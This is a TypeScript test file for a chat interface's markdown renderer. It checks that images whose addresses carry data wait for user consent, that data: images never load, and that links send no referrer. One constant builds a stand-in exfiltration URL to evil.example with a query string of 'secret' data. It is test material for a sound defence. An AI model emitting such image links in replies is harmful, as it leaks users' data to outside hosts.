import { afterEach, expect, test } from "bun:test";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { TextMessagePartProvider } from "@assistant-ui/react";

import { installDom } from "@/test/dom";
import { MarkdownText } from "./markdown-text";

let restore: (() => void) | undefined;
let mounted: Root | undefined;
afterEach(() => {
  if (mounted) act(() => mounted!.unmount());
  mounted = undefined;
  restore?.();
  restore = undefined;
});

async function reply(text: string) {
  restore = installDom();
  const host = document.createElement("div");
  document.body.append(host);
  const root = createRoot(host);
  mounted = root;
  await act(async () =>
    root.render(
      <TextMessagePartProvider text={text} isRunning={false}>
        <MarkdownText />
      </TextMessagePartProvider>,
    ),
  );
  await act(async () => { for (let i = 0; i < 4; i++) await Promise.resolve(); });
  return host;
}

const carrier = `https://evil.example/p.png?d=${"secret".repeat(14)}`;
const click = (button: Element) => act(async () => { (button as HTMLElement).click(); });
const buttonNamed = (host: HTMLElement, name: string) =>
  [...host.querySelectorAll("button")].find((b) => b.textContent === name)!;

test("a reply's normal image loads without asking", async () => {
  const host = await reply("![logo](https://i.imgur.com/AbCd123.png)");
  expect(host.querySelector("img")?.getAttribute("src")).toBe("https://i.imgur.com/AbCd123.png");
  expect(host.querySelector("button")).toBeNull();
});

test("an image address that carries data shows the host and full address, with no img until Load", async () => {
  const host = await reply(`![chart](${carrier})`);
  expect(host.querySelector("img")).toBeNull();
  expect(host.textContent).toContain("Load image from evil.example?");
  expect(host.textContent).toContain(carrier);
  await click(buttonNamed(host, "Load"));
  expect(host.querySelector("img")?.getAttribute("src")).toBe(carrier);
});

test("Not now leaves the image's description and no img", async () => {
  const host = await reply(`![chart](${carrier})`);
  await click(buttonNamed(host, "Not now"));
  expect(host.querySelector("img")).toBeNull();
  expect(host.querySelector("button")).toBeNull();
  expect(host.textContent).toContain("chart");
});

test("a data: image never loads and never asks", async () => {
  const host = await reply("![dot](data:image/png;base64,iVBORw0KGgo=)");
  expect(host.querySelector("img")).toBeNull();
  expect(host.querySelector("button")).toBeNull();
});

test("a link in a reply sends no referrer and no opener", async () => {
  const host = await reply("[docs](https://example.com/docs)");
  const link = host.querySelector("a")!;
  expect(link.getAttribute("href")).toBe("https://example.com/docs");
  expect(link.getAttribute("rel")).toBe("noopener noreferrer nofollow");
  expect(link.getAttribute("referrerpolicy")).toBe("no-referrer");
});
